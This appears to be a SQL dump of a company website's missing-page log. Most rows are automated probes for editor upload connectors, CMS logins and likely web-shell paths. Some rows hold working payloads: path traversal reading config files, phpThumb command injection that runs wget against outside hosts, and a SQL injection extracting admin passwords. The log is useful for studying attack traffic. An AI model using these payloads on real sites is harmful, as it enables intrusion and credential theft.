(795, 'http://www.flotechcontrols.com/fckeditor/editor/filemanager/connectors/php/upload.php', '', '', '', 1, 0, '2014-10-13 02:48:47', '0000-00-00 00:00:00'),
(796, 'http://www.flotechcontrols.com/ckfinder/core/connector/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:48:58', '0000-00-00 00:00:00'),
(797, 'http://www.flotechcontrols.com/FCKeditor/editor/filemanager/upload/php/upload.php', '', '', '', 1, 0, '2014-10-13 02:50:31', '0000-00-00 00:00:00'),
(798, 'http://www.flotechcontrols.com/editors/fckeditor/editor/filemanager/connectors/php/upload.php', '', '', '', 1, 0, '2014-10-13 02:50:42', '0000-00-00 00:00:00'),
(799, 'http://www.flotechcontrols.com/editors/fckeditor/editor/filemanager/connectors/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:51:12', '0000-00-00 00:00:00'),
(800, 'http://www.flotechcontrols.com/includes/fckeditor/editor/filemanager/connectors/php/connector.php', '', '', '', 1, 0, '2014-10-13 02:53:35', '0000-00-00 00:00:00'),
(801, 'http://www.flotechcontrols.com/admin/FCKeditor/editor/dialog', '', '', '', 1, 0, '2014-10-13 02:53:56', '0000-00-00 00:00:00'),
(802, 'http://flotechcontrols.com/wpfeed.php', '', '', '', 1, 0, '2014-10-13 09:31:35', '0000-00-00 00:00:00'),
(803, 'http://flotechcontrols.com/Fckeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-10-14 21:27:40', '0000-00-00 00:00:00'),
(804, 'http://flotechcontrols.com/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-10-14 21:27:40', '0000-00-00 00:00:00'),
(805, 'http://flotechcontrols.com/admin/FCKeditor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-10-14 21:27:42', '0000-00-00 00:00:00'),
(806, 'http://flotechcontrols.com/editor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-10-14 21:27:42', '0000-00-00 00:00:00'),
(807, 'http://flotechcontrols.com/editor/editor/filemanager/connectors/test.html', '', '', '', 1, 0, '2014-10-14 21:27:43', '0000-00-00 00:00:00'),
(808, 'http://flotechcontrols.com/media/editors/functions.php', '', '', '', 1, 0, '2014-10-15 02:13:01', '0000-00-00 00:00:00'),
(809, 'http://flotechcontrols.com/modules/online/online.php', '', '', '', 1, 0, '2014-10-16 13:14:50', '0000-00-00 00:00:00'),
(810, 'http://flotechcontrols.com/modules/mod_rssemailer/mod_rssemailer.php', '', '', '', 1, 0, '2014-10-16 23:13:39', '0000-00-00 00:00:00'),
(811, 'http://flotechcontrols.com/cache/online.php', '', '', '', 1, 0, '2014-10-16 23:41:01', '0000-00-00 00:00:00'),
(812, 'http://www.flotechcontrols.com/admin/fckeditor/editor/', '', '', '', 1, 0, '2014-10-17 01:00:24', '0000-00-00 00:00:00'),
(813, 'http://www.flotechcontrols.com/fckeditor/editor/', '', '', '', 1, 0, '2014-10-17 01:00:25', '0000-00-00 00:00:00'),
(814, 'http://www.flotechcontrols.com/js/fckeditor/editor/', '', '', '', 1, 0, '2014-10-17 01:00:25', '0000-00-00 00:00:00'),
(815, 'http://www.flotechcontrols.com/system/fckeditor/editor/', '', '', '', 1, 0, '2014-10-17 01:00:25', '0000-00-00 00:00:00'),
(816, 'http://www.flotechcontrols.com/include/fckeditor/editor/', '', '', '', 1, 0, '2014-10-17 01:00:25', '0000-00-00 00:00:00'),
(817, 'http://www.flotechcontrols.com/manage/fckeditor/editor/', '', '', '', 1, 0, '2014-10-17 01:00:28', '0000-00-00 00:00:00'),
(818, 'http://flotechcontrols.com/plugins/captcha/jproicaptcha.php', '', '', '', 1, 0, '2014-10-17 11:38:23', '0000-00-00 00:00:00'),
(819, 'http://flotechcontrols.com/uu.php', '', '', '', 1, 0, '2014-10-18 00:42:09', '0000-00-00 00:00:00'),
(820, 'http://flotechcontrols.com/zpl.php', '', '', '', 1, 0, '2014-10-19 03:29:24', '0000-00-00 00:00:00'),
(821, 'http://www.flotechcontrols.com/zpl.php', '', '', '', 1, 0, '2014-10-19 03:29:25', '0000-00-00 00:00:00'),
(822, 'http://flotechcontrols.com/administrator/components/com_joomlaupdate/restoration.php', '', '', '', 1, 0, '2014-10-21 08:59:50', '0000-00-00 00:00:00'),
(823, 'http://flotechcontrols.com/libraries/joomla/version.php?lala', '', '', '', 1, 0, '2014-10-23 04:07:03', '0000-00-00 00:00:00'),
(824, 'http://flotechcontrols.com/test/wp-admin/', '', '', '', 1, 0, '2014-10-26 06:31:13', '0000-00-00 00:00:00'),
(825, 'http://www.flotechcontrols.com/images/brochures/V1-4-Datasheet.pdf', '', '', '', 1, 0, '2014-10-26 22:54:46', '0000-00-00 00:00:00'),
(826, 'http://www.flotechcontrols.com/images/brochures/V14-Datasheet.pdf', '', '', '', 1, 0, '2014-10-26 22:54:52', '0000-00-00 00:00:00'),
(827, 'http://flotechcontrols.com/includes/domit/xml_domit_rss.php?lala', '', '', '', 1, 0, '2014-10-27 08:44:33', '0000-00-00 00:00:00'),
(828, 'http://flotechcontrols.com/administrator/components/com_virtuemart/version.php?lala', '', '', '', 1, 0, '2014-10-28 05:50:45', '0000-00-00 00:00:00'),
(829, 'http://flotechcontrols.com/administrator/components/com_ccideal/helper/version.php?lala', '', '', '', 1, 0, '2014-10-28 05:53:11', '0000-00-00 00:00:00'),
(830, 'http://flotechcontrols.com/components/com_sobi2/includes/rss.class.php?lala', '', '', '', 1, 0, '2014-10-28 05:57:19', '0000-00-00 00:00:00'),
(831, 'http://flotechcontrols.com/administrator/components/com_acajoom/version.php?lala', '', '', '', 1, 0, '2014-10-28 07:38:03', '0000-00-00 00:00:00'),
(832, 'http://flotechcontrols.com//customer/account/forgotpassword/', '', '', '', 1, 0, '2014-10-31 08:40:33', '0000-00-00 00:00:00'),
(833, 'http://flotechcontrols.com/images/teasers.php?t3751n', '', '', '', 1, 0, '2014-11-01 08:25:55', '0000-00-00 00:00:00'),
(834, 'http://flotechcontrols.com/archiver', '', '', '', 1, 0, '2014-11-03 18:20:13', '0000-00-00 00:00:00'),
(835, 'http://flotechcontrols.com/wp-cron.php', '', '', '', 1, 0, '2014-11-03 18:20:15', '0000-00-00 00:00:00'),
(836, 'http://flotechcontrols.com/wp-content', '', '', '', 1, 0, '2014-11-03 18:20:16', '0000-00-00 00:00:00'),
(837, 'http://flotechcontrols.com/readme.html', '', '', '', 1, 0, '2014-11-03 18:20:17', '0000-00-00 00:00:00'),
(838, 'http://flotechcontrols.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.phpindex.php', '', 'flotechcontrols.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.phpindex.php', '', 1, 0, '2014-11-04 02:01:33', '0000-00-00 00:00:00'),
(839, 'http://flotechcontrols.com/section/wp-login.php', '', '', '', 1, 0, '2014-11-06 06:27:44', '0000-00-00 00:00:00'),
(840, 'http://flotechcontrols.com/site/wp-login.php', '', '', '', 1, 0, '2014-11-06 06:27:45', '0000-00-00 00:00:00'),
(841, 'http://flotechcontrols.com/wp-login/', '', '', '', 1, 0, '2014-11-06 06:27:49', '0000-00-00 00:00:00'),
(842, 'http://www.flotechcontrols.com//index.php', '', '', '', 1, 0, '2014-11-08 06:18:53', '0000-00-00 00:00:00'),
(843, 'http://www.flotechcontrols.com/media/jui/js/)[this.options.html', '', '', '', 1, 0, '2014-11-08 12:02:47', '0000-00-00 00:00:00'),
(844, 'http://www.flotechcontrols.com/media/system/js/);if(!b){b=new', '', '', '', 1, 0, '2014-11-08 12:02:51', '0000-00-00 00:00:00'),
(845, 'http://www.flotechcontrols.com/media/system/js/,i)}var', '', '', '', 1, 0, '2014-11-08 12:02:54', '0000-00-00 00:00:00'),
(846, 'http://www.flotechcontrols.com/system/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 'http://www.flotechcontrols.com/system/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', 1, 0, '2014-11-11 06:08:36', '0000-00-00 00:00:00'),
(847, 'http://flotechcontrols.com/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php', '', 'http://flotechcontrols.com/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php', '', 1, 0, '2014-11-18 00:37:34', '0000-00-00 00:00:00'),
(848, 'http://flotechcontrols.com/cms/', '', 'http://flotechcontrols.com', '', 1, 0, '2014-11-18 09:34:20', '0000-00-00 00:00:00'),
(849, 'http://flotechcontrols.com/site/', '', 'http://flotechcontrols.com', '', 1, 0, '2014-11-18 12:24:06', '0000-00-00 00:00:00'),
(850, 'http://flotechcontrols.com/wordpress/', '', 'http://flotechcontrols.com', '', 1, 0, '2014-11-18 15:51:26', '0000-00-00 00:00:00'),
(851, 'http://flotechcontrols.com/wp/', '', 'http://flotechcontrols.com', '', 1, 0, '2014-11-18 17:23:54', '0000-00-00 00:00:00'),
(852, 'http://flotechcontrols.com/magmi/web/magmi.php', '', '', '', 1, 0, '2014-11-25 03:56:27', '0000-00-00 00:00:00'),
(853, 'http://flotechcontrols.com/components/com_creativecontactform/fileupload/index.php', '', '', '', 1, 0, '2014-11-25 15:41:35', '0000-00-00 00:00:00'),
(854, 'http://flotechcontrols.com/components/com_jmultimedia/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg&fltr%5B%5D=blur%7C9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg%20;%20wget%20http://megatech-news.ucoz.ru/temp.txt%20-O%20temp404.txt', '', 'http://google.com', '', 1, 0, '2014-11-27 17:17:15', '0000-00-00 00:00:00'),
(856, 'http://www.flotechcontrols.com//wp-admin/admin-ajax.php', '', '', '', 1, 0, '2014-11-29 21:30:14', '0000-00-00 00:00:00'),
(857, 'http://flotechcontrols.com/images/stories/x.php?indonesia', '', 'http://flotechcontrols.com/images/stories/x.php?indonesia', '', 1, 0, '2014-11-30 09:54:04', '0000-00-00 00:00:00'),
(858, 'http://www.flotechcontrols.com/site/wp-login.php', '', '', '', 1, 0, '2014-12-01 14:52:50', '0000-00-00 00:00:00'),
(859, 'http://www.flotechcontrols.com/old/wp-login.php', '', '', '', 1, 0, '2014-12-01 14:52:50', '0000-00-00 00:00:00'),
(860, 'http://www.flotechcontrols.com/shop/wp-login.php', '', '', '', 1, 0, '2014-12-01 14:52:51', '0000-00-00 00:00:00'),
(861, 'http://www.flotechcontrols.com/store/wp-login.php', '', '', '', 1, 0, '2014-12-01 14:52:51', '0000-00-00 00:00:00'),
(862, 'http://www.flotechcontrols.com/blogs/wp-login.php', '', '', '', 1, 0, '2014-12-01 14:52:52', '0000-00-00 00:00:00'),
(863, 'http://www.flotechcontrols.com/forum/wp-login.php', '', '', '', 1, 0, '2014-12-01 14:52:53', '0000-00-00 00:00:00'),
(864, 'http://flotechcontrols.com/wp-content/uploads/wpcron.php', '', '', '', 1, 0, '2014-12-04 02:18:33', '0000-00-00 00:00:00'),
(865, 'http://www.flotechcontrols.com/about-us;sa=U;ei=oQWAVIjNMs-puwTbg4G4Ag;ved=0CBQQFjAA;usg=AFQjCNH9nM3I_njLNqDjp7m9D6YgoNRthQ', '', 'http://www.google.com', '', 1, 0, '2014-12-04 06:56:38', '0000-00-00 00:00:00'),
(866, 'http://flotechcontrols.com//components/com_community/index.html', '', '', '', 1, 0, '2014-12-04 14:10:01', '0000-00-00 00:00:00'),
(867, 'http://flotechcontrols.com/administrator/components/com_joomlaupdate/wt5121n.php', '', 'http://flotechcontrols.com/administrator/components/com_joomlaupdate/wt5121n.php', '', 1, 0, '2014-12-05 10:51:11', '0000-00-00 00:00:00'),
(868, 'http://flotechcontrols.com/components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php?name=cell.pHp&141211-015246', '', '', '', 1, 0, '2014-12-11 00:52:35', '0000-00-00 00:00:00'),
(869, 'http://flotechcontrols.com/components/com_oziogallery2/imagin/scripts_ralcr/filesystem/writeToFile.php?141211-015249', '', '', '', 1, 0, '2014-12-11 00:52:39', '0000-00-00 00:00:00'),
(870, 'http://flotechcontrols.com/components/com_oziogallery/imagin/scripts_ralcr/filesystem/writeToFile.php?141211-015250', '', '', '', 1, 0, '2014-12-11 00:52:39', '0000-00-00 00:00:00'),
(871, 'http://www.flotechcontrols.com/manage/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-12-12 08:49:06', '0000-00-00 00:00:00'),
(872, 'http://www.flotechcontrols.com/js/fckeditor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-12-12 12:17:49', '0000-00-00 00:00:00'),
(873, 'http://flotechcontrols.com/images/syslib.php', '', '', '', 1, 0, '2014-12-16 10:35:28', '0000-00-00 00:00:00'),
(874, 'http://flotechcontrols.com/modules/mod_ariimagesws/mod_ariimagesws.php', '', '', '', 1, 0, '2014-12-16 11:12:48', '0000-00-00 00:00:00'),
(875, 'http://flotechcontrols.com/templates/system/print.php?error=Jjhyf8fs2', '', '', '', 1, 0, '2014-12-16 14:40:32', '0000-00-00 00:00:00'),
(876, 'http://flotechcontrols.com/includes/jquery.php?q=Pass12$', '', '', '', 1, 0, '2014-12-16 14:40:33', '0000-00-00 00:00:00'),
(877, 'http://flotechcontrols.com/images/stories/muakero.php', '', '', '', 1, 0, '2014-12-16 17:25:14', '0000-00-00 00:00:00'),
(878, 'http://www.flotechcontrols.com/plus/recommend.php?action=&aid=1&_FILES%5Btype%5D%5Btmp_name%5D=%5C%27%20or%20mid=@%60%5C%27%60%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+%60%23@__admin%60%20limit+0,1),5,6,7,8,9%23@%', '', '', '', 1, 0, '2014-12-17 08:50:57', '0000-00-00 00:00:00'),
(879, 'http://flotechcontrols.com/modules/mod_araticlws/mod_araticlws.php', '', '', '', 1, 0, '2014-12-17 21:19:09', '0000-00-00 00:00:00'),
(880, 'http://flotechcontrols.com/components/com_banners/moderator.php', '', '', '', 1, 0, '2014-12-17 22:09:40', '0000-00-00 00:00:00'),
(881, 'http://flotechcontrols.com/includes/xmlmenu.class.php?dosyakontrol=1', '', '', '', 1, 0, '2014-12-17 23:17:47', '0000-00-00 00:00:00'),
(882, 'http://flotechcontrols.com/components/com_media/com_media.php', '', '', '', 1, 0, '2014-12-18 00:15:33', '0000-00-00 00:00:00'),
(883, 'http://flotechcontrols.com/modules/mod_arateiclws/mod_arateiclws.php', '', '', '', 1, 0, '2014-12-18 10:16:50', '0000-00-00 00:00:00'),
(884, 'http://flotechcontrols.com/administrator/components/com_joomlaupdate/moderator.php', '', '', '', 1, 0, '2014-12-18 22:49:44', '0000-00-00 00:00:00'),
(885, 'http://flotechcontrols.com/administrator/components/com_joomlaupdate/mod.php', '', '', '', 1, 0, '2014-12-18 22:49:46', '0000-00-00 00:00:00'),
(886, 'http://flotechcontrols.com/administrator/components/com_joomlaupdate/brow.php', '', '', '', 1, 0, '2014-12-18 23:26:20', '0000-00-00 00:00:00'),
(887, 'http://flotechcontrols.com/libraries/fof/database/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(888, 'http://flotechcontrols.com/libraries/joomla/github/package/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(889, 'http://flotechcontrols.com/media/editors/tinymce/skins/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(890, 'http://flotechcontrols.com/libraries/cms/component/router/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(891, 'http://flotechcontrols.com/administrator/components/com_menus/layouts/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(892, 'http://flotechcontrols.com/media/editors/tinymce/themes/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(893, 'http://flotechcontrols.com/media/com_banners/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(894, 'http://flotechcontrols.com/media/editors/tinymce/plugins/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(895, 'http://flotechcontrols.com/libraries/framework/Joomla/', '', '', '', 1, 0, '2014-12-21 09:48:25', '0000-00-00 00:00:00'),
(896, 'http://flotechcontrols.com/images/mainik.php', '', '', '', 1, 0, '2014-12-21 21:03:33', '0000-00-00 00:00:00'),
(897, 'http://flotechcontrols.com/components/com_jmultimedia/assets/thumbs/phpthumb/phpThumb.php?src=file.jpg&fltr%5B%5D=blur%7C9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg%20;%20wget%20http://top2015-seo.ucoz.ru/temp.txt%20-O%20ubjdpvfg.txt%', '', 'http://google.com', '', 1, 0, '2014-12-22 17:20:24', '0000-00-00 00:00:00'),
(898, 'http://flotechcontrols.com/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php?type=file&folder=', '', 'http://google.com', '', 1, 0, '2014-12-22 17:20:47', '0000-00-00 00:00:00'),
(899, 'http://www.flotechcontrols.com/wp-admin/admin-ajax.php?141223-012721', '', '', '', 1, 0, '2014-12-23 00:27:18', '0000-00-00 00:00:00'),
(900, 'http://flotechcontrols.com/inc/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(901, 'http://flotechcontrols.com/manage/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(902, 'http://flotechcontrols.com/common/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(903, 'http://flotechcontrols.com/js/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(904, 'http://flotechcontrols.com/admin/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(905, 'http://flotechcontrols.com/inc/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(906, 'http://flotechcontrols.com/scripts/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(907, 'http://flotechcontrols.com/system/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(908, 'http://flotechcontrols.com/include/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(909, 'http://flotechcontrols.com/editor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(910, 'http://flotechcontrols.com/includes/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(911, 'http://flotechcontrols.com/editor/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(912, 'http://flotechcontrols.com/fckeditor/editor/', '', '', '', 1, 0, '2014-12-23 10:41:57', '0000-00-00 00:00:00'),
(913, 'http://www.flotechcontrols.com/editor/editor', '', '', '', 1, 0, '2014-12-24 18:23:46', '0000-00-00 00:00:00'),
(914, 'http://www.flotechcontrols.com/fckeditor/editor', '', '', '', 1, 0, '2014-12-24 18:23:46', '0000-00-00 00:00:00'),
(915, 'http://flotechcontrols.com/fckeditor/editor', '', '', '', 1, 0, '2014-12-24 18:23:51', '0000-00-00 00:00:00'),
(916, 'http://flotechcontrols.com/images/stories/ujuujn.php', '', 'http://google.com', '', 1, 0, '2014-12-26 13:14:52', '0000-00-00 00:00:00'),
(917, 'http://flotechcontrols.com/components/com_contact/init.php', '', '', '', 1, 0, '2014-12-26 16:09:18', '0000-00-00 00:00:00'),
(918, 'http://flotechcontrols.com/administrator/images/syslib.php', '', '', '', 1, 0, '2014-12-27 03:22:58', '0000-00-00 00:00:00'),
(919, 'http://flotechcontrols.com//index.php', '', '', '', 1, 0, '2015-01-05 19:11:03', '0000-00-00 00:00:00'),
(920, 'http://flotechcontrols.com/Fckeditorold/editor/', '', '', '', 1, 0, '2015-01-08 01:30:54', '0000-00-00 00:00:00'),
(921, 'http://flotechcontrols.com/editor1/editor/', '', '', '', 1, 0, '2015-01-08 01:30:54', '0000-00-00 00:00:00'),
(922, 'http://flotechcontrols.com/sysadmin/fckeditor/editor/', '', '', '', 1, 0, '2015-01-08 01:30:54', '0000-00-00 00:00:00'),
(923, 'http://flotechcontrols.com/Fckeditornew/editor/', '', '', '', 1, 0, '2015-01-08 01:30:55', '0000-00-00 00:00:00'),
(924, 'http://flotechcontrols.com/editorold/editor/', '', '', '', 1, 0, '2015-01-08 01:30:55', '0000-00-00 00:00:00'),
(925, 'http://flotechcontrols.com/ckeditor/editor/', '', '', '', 1, 0, '2015-01-08 01:30:55', '0000-00-00 00:00:00'),
(926, 'http://flotechcontrols.com/fck/editor/', '', '', '', 1, 0, '2015-01-08 01:30:56', '0000-00-00 00:00:00'),
(927, 'http://FLOTECHCONTROLS.COM/gsdhdssgfsdgfdgf', '', 'FLOTECHCONTROLS.COM/gsdhdssgfsdgfdgf', '', 1, 0, '2015-01-08 18:00:16', '0000-00-00 00:00:00'),
(928, 'http://FLOTECHCONTROLS.COM/gsdhdssgfsdgfdgfindex.php', '', 'FLOTECHCONTROLS.COM/gsdhdssgfsdgfdgfindex.php', '', 1, 0, '2015-01-08 18:00:17', '0000-00-00 00:00:00'),
(929, 'http://flotechcontrols.com/includes/read.php', '', '', '', 1, 0, '2015-01-11 11:08:55', '0000-00-00 00:00:00'),
(930, 'http://flotechcontrols.com/libraries/phpmailer/config.php?action', '', '', '', 1, 0, '2015-01-13 04:26:46', '0000-00-00 00:00:00'),
(931, 'http://FLOTECHCONTROLS.COM/wp-admin/admin-ajax.php', '', '', '', 1, 0, '2015-01-13 10:52:19', '0000-00-00 00:00:00'),
(932, 'http://flotechcontrols.com//about-us/about-us', '', '', '', 1, 0, '2015-01-14 02:31:23', '0000-00-00 00:00:00'),
(933, 'http://flotechcontrols.com//about-us/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:31:25', '0000-00-00 00:00:00'),
(934, 'http://flotechcontrols.com//about-us/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:31:26', '0000-00-00 00:00:00'),
(935, 'http://flotechcontrols.com//about-us/products/wey', '', '', '', 1, 0, '2015-01-14 02:31:28', '0000-00-00 00:00:00'),
(936, 'http://flotechcontrols.com//about-us/products/noreva', '', '', '', 1, 0, '2015-01-14 02:31:30', '0000-00-00 00:00:00'),
(937, 'http://flotechcontrols.com//about-us/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:31:31', '0000-00-00 00:00:00'),
(938, 'http://flotechcontrols.com//about-us/products/birkett', '', '', '', 1, 0, '2015-01-14 02:31:33', '0000-00-00 00:00:00'),
(939, 'http://flotechcontrols.com//about-us/products/sor', '', '', '', 1, 0, '2015-01-14 02:31:34', '0000-00-00 00:00:00'),
(940, 'http://flotechcontrols.com//about-us/products/mts', '', '', '', 1, 0, '2015-01-14 02:31:36', '0000-00-00 00:00:00'),
(941, 'http://flotechcontrols.com//about-us/products/copes', '', '', '', 1, 0, '2015-01-14 02:31:38', '0000-00-00 00:00:00'),
(942, 'http://flotechcontrols.com//about-us/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:31:39', '0000-00-00 00:00:00'),
(943, 'http://flotechcontrols.com//about-us/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:31:41', '0000-00-00 00:00:00'),
(944, 'http://flotechcontrols.com//about-us/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:31:43', '0000-00-00 00:00:00'),
(945, 'http://flotechcontrols.com//about-us/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:31:44', '0000-00-00 00:00:00'),
(946, 'http://flotechcontrols.com//about-us/contact-us', '', '', '', 1, 0, '2015-01-14 02:31:46', '0000-00-00 00:00:00'),
(947, 'http://flotechcontrols.com//products/red-valve/about-us', '', '', '', 1, 0, '2015-01-14 02:31:49', '0000-00-00 00:00:00'),
(948, 'http://flotechcontrols.com//products/red-valve/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:31:51', '0000-00-00 00:00:00'),
(949, 'http://flotechcontrols.com//products/red-valve/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:31:53', '0000-00-00 00:00:00'),
(950, 'http://flotechcontrols.com//products/red-valve/products/wey', '', '', '', 1, 0, '2015-01-14 02:31:54', '0000-00-00 00:00:00'),
(951, 'http://flotechcontrols.com//products/red-valve/products/noreva', '', '', '', 1, 0, '2015-01-14 02:31:56', '0000-00-00 00:00:00'),
(952, 'http://flotechcontrols.com//products/red-valve/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:31:57', '0000-00-00 00:00:00'),
(953, 'http://flotechcontrols.com//products/red-valve/products/birkett', '', '', '', 1, 0, '2015-01-14 02:31:59', '0000-00-00 00:00:00'),
(954, 'http://flotechcontrols.com//products/red-valve/products/sor', '', '', '', 1, 0, '2015-01-14 02:32:01', '0000-00-00 00:00:00'),
(955, 'http://flotechcontrols.com//products/red-valve/products/mts', '', '', '', 1, 0, '2015-01-14 02:32:02', '0000-00-00 00:00:00'),
(956, 'http://flotechcontrols.com//products/red-valve/products/copes', '', '', '', 1, 0, '2015-01-14 02:32:04', '0000-00-00 00:00:00'),
(957, 'http://flotechcontrols.com//products/red-valve/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:32:06', '0000-00-00 00:00:00'),
(958, 'http://flotechcontrols.com//products/red-valve/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:32:07', '0000-00-00 00:00:00'),
(959, 'http://flotechcontrols.com//products/red-valve/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:32:09', '0000-00-00 00:00:00'),
(960, 'http://flotechcontrols.com//products/red-valve/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:32:10', '0000-00-00 00:00:00'),
(961, 'http://flotechcontrols.com//products/red-valve/contact-us', '', '', '', 1, 0, '2015-01-14 02:32:12', '0000-00-00 00:00:00'),
(962, 'http://flotechcontrols.com//products/tideflex/about-us', '', '', '', 1, 0, '2015-01-14 02:32:16', '0000-00-00 00:00:00'),
(963, 'http://flotechcontrols.com//products/tideflex/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:32:17', '0000-00-00 00:00:00'),
(964, 'http://flotechcontrols.com//products/tideflex/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:32:19', '0000-00-00 00:00:00'),
(965, 'http://flotechcontrols.com//products/tideflex/products/wey', '', '', '', 1, 0, '2015-01-14 02:32:21', '0000-00-00 00:00:00'),
(966, 'http://flotechcontrols.com//products/tideflex/products/noreva', '', '', '', 1, 0, '2015-01-14 02:32:22', '0000-00-00 00:00:00'),
(967, 'http://flotechcontrols.com//products/tideflex/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:32:24', '0000-00-00 00:00:00'),
(968, 'http://flotechcontrols.com//products/tideflex/products/birkett', '', '', '', 1, 0, '2015-01-14 02:32:26', '0000-00-00 00:00:00'),
(969, 'http://flotechcontrols.com//products/tideflex/products/sor', '', '', '', 1, 0, '2015-01-14 02:32:27', '0000-00-00 00:00:00'),
(970, 'http://flotechcontrols.com//products/tideflex/products/mts', '', '', '', 1, 0, '2015-01-14 02:32:29', '0000-00-00 00:00:00'),
(971, 'http://flotechcontrols.com//products/tideflex/products/copes', '', '', '', 1, 0, '2015-01-14 02:32:31', '0000-00-00 00:00:00'),
(972, 'http://flotechcontrols.com//products/tideflex/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:32:32', '0000-00-00 00:00:00'),
(973, 'http://flotechcontrols.com//products/tideflex/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:32:34', '0000-00-00 00:00:00'),
(974, 'http://flotechcontrols.com//products/tideflex/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:32:36', '0000-00-00 00:00:00'),
(975, 'http://flotechcontrols.com//products/tideflex/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:32:37', '0000-00-00 00:00:00'),
(976, 'http://flotechcontrols.com//products/tideflex/contact-us', '', '', '', 1, 0, '2015-01-14 02:32:39', '0000-00-00 00:00:00'),
(977, 'http://flotechcontrols.com//products/wey/about-us', '', '', '', 1, 0, '2015-01-14 02:32:42', '0000-00-00 00:00:00'),
(978, 'http://flotechcontrols.com//products/wey/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:32:44', '0000-00-00 00:00:00'),
(979, 'http://flotechcontrols.com//products/wey/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:32:46', '0000-00-00 00:00:00'),
(980, 'http://flotechcontrols.com//products/wey/products/wey', '', '', '', 1, 0, '2015-01-14 02:32:47', '0000-00-00 00:00:00'),
(981, 'http://flotechcontrols.com//products/wey/products/noreva', '', '', '', 1, 0, '2015-01-14 02:32:49', '0000-00-00 00:00:00'),
(982, 'http://flotechcontrols.com//products/wey/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:32:50', '0000-00-00 00:00:00'),
(983, 'http://flotechcontrols.com//products/wey/products/birkett', '', '', '', 1, 0, '2015-01-14 02:32:52', '0000-00-00 00:00:00'),
(984, 'http://flotechcontrols.com//products/wey/products/sor', '', '', '', 1, 0, '2015-01-14 02:32:54', '0000-00-00 00:00:00'),
(985, 'http://flotechcontrols.com//products/wey/products/mts', '', '', '', 1, 0, '2015-01-14 02:32:55', '0000-00-00 00:00:00'),
(986, 'http://flotechcontrols.com//products/wey/products/copes', '', '', '', 1, 0, '2015-01-14 02:32:57', '0000-00-00 00:00:00'),
